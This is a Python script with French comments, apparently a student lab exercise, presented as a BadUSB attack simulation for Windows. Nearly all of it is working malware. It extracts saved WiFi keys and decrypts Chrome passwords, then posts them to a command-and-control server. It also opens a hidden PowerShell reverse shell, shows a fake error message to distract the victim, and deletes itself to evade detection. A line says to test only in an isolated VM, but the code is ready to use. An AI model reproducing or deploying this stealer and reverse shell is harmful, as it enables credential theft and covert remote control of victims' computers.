# How-To: Script simulant un keylogger BadUSB sur Windows - Version adaptée pour plus de furtivité et originalité
# 1. Exécuter via BadUSB (ex. P4wnP1 ou Ducky Script) : Émule un clavier pour lancer silencieusement.
# 2. Extraction WiFi et browser creds (Chrome).
# 3. Envoyer à C2 via HTTP POST.
# 4. Furtivité ajoutée : Délai random, exécution sans pop-up, suppression du script après run, faux message d'erreur pour distraire l'utilisateur.
# 5. Originalité : Ajout d'un 'reverse shell' simple (cmd.exe redirigé vers C2) pour contrôle distant basique.
# 6. Tester uniquement dans VM isolée (Windows victime).
# 7. Adaptation : IP C2 mise à jour pour un placeholder - remplace par l'IP réelle de ta VM Kali (ex. 192.168.109.128 ou celle actuelle).
# Matricules: [INSÉRER TES MATRICULES ICI]

import subprocess
import sqlite3
import os
import requests
import win32crypt  # Nécessite pywin32
import time
import random  # Pour délai random

# Étape 1: Extraire identifiants WiFi
def get_wifi_creds():
    try:
        profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore')
        wifi_data = {}
        for line in profiles.split('\n'):
            if "All User Profile" in line:
                profile_name = line.split(':')[1].strip()
                details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear']).decode('utf-8', errors='ignore')
                for detail in details.split('\n'):
                    if "Key Content" in detail:
                        wifi_data[profile_name] = detail.split(':')[1].strip()
        return wifi_data
    except Exception as e:
        return {"error": str(e)}

# Étape 2: Extraire identifiants Chrome
def get_browser_creds():
    try:
        chrome_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
        if not os.path.exists(chrome_db):
            return [{"error": "Chrome DB not found"}]
        conn = sqlite3.connect(chrome_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        credentials = []
        for row in cursor.fetchall():
            url, username, encrypted_pass = row
            try:
                password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
                credentials.append({"url": url, "username": username, "password": password})
            except:
                continue
        conn.close()
        return credentials
    except Exception as e:
        return [{"error": str(e)}]

# Étape 3: Envoyer à C2 (furtif : pas de print sauf erreur debug)
def send_to_c2(data):
    c2_url = "http://[IP_DE_TA_VM_KALI]:8080"  # Adapte ici à l'IP réelle de Kali (ex. 192.168.109.128)
    try:
        requests.post(c2_url, json=data, timeout=10)  # Augmenté timeout à 10s pour réseaux lents
    except:
        pass  # Silencieux pour furtivité

# Étape 4: Originalité - Ouvrir un reverse shell simple vers C2 (ex. cmd.exe redirigé)
def open_reverse_shell():
    try:
        # Lance cmd.exe en arrière-plan et redirige vers un port C2 (ex. netcat listener sur Kali)
        # Note : Nécessite netcat ou similaire sur C2. Ici, exemple avec powershell.
        subprocess.Popen(['powershell', '-NoP', '-NonI', '-W', 'Hidden', '-Exec', 'Bypass', 
                          '$client = New-Object System.Net.Sockets.TCPClient("[IP_DE_TA_VM_KALI]", 4444);' 
                          '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;' 
                          '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );' 
                          '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'])
    except:
        pass  # Silencieux

# Main - Furtivité : Délai random (1-10s) pour éviter détection AV/timing
if __name__ == "__main__":
    time.sleep(random.randint(1, 10))  # Délai random pour originalité/furtivité
    # Affiche un faux message pour distraire (originalité)
    subprocess.call(['msg', '*', 'Erreur USB détectée - Veuillez retirer et réinsérer la clé.'])
    
    wifi_data = get_wifi_creds()
    browser_data = get_browser_creds()
    payload = {"wifi": wifi_data, "browser": browser_data, "matricules": "[TES_MATRICULES]", "victim_ip": "[IP_DE_TA_VM_WINDOWS]"}
    send_to_c2(payload)
    
    open_reverse_shell()  # Originalité : Ajout du reverse shell
    
    # Furtivité : Supprime le script après exécution
    try:
        os.remove(__file__)
    except:
        pass
